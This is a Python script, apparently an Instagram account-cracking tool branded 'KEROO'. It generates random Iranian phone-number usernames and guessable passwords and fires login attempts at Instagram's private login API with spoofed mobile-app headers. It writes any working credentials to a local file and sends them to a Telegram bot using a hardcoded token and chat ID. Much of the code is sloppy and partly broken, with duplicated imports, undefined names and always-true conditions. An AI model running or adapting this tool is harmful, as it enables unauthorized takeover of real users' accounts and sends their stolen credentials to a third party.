try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os

import sys
import requests
os.system("clear")
B ='\033[1;92m'
A ='\033[1;91m'
import os,sys,subprocess
subprocess.getoutput("pip install requests")

    

import requests,sys,os,time
import webbrowser 
import pyfiglet


SSS = pyfiglet.figlet_format('*KEROO*')
MMM = (' @ciiss')
print (SSS+MMM)

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;92m'

print('════════ ✥.KRO.✥ ════════')
def close():
    input('- Press Enter To Exit /')
    sys.exit()
h , b,s,block = 0,0,0,0
tele = input("ENTER PASSWORD : ")
print("════════ ✥.KRO.✥ ════════")
if "KRO" in tele:
    id = '2021068735'

    bot = '2052387062:AAGO4ZwvpBMC_Q0Lu5OqmndYOsFfnrQjELY'

elif "y" in tele:
    id = input("ID : ")
    bot = input("TOKEN : ")
print("════════ ✥.KRO.✥ ════════")
ask = input(""" ENTER NUM [1] """)
if ask == "1":
   
    
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

        
while True:
        user = '1234567890'
        KRO = str("".join(random.choice(user)for i in range(7)))
        user= '+98990'+KRO
        pasw = '0990'+KRO
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=KEROO IS HERE ⚙️🔐 \n══════◄••KRO••►══════\n USER ⚙️   : {user} \n PASS 🔐  : {pasw}\n══════◄••KRO••►══════\n •:@ciiss")
            open("KRO.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\033[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
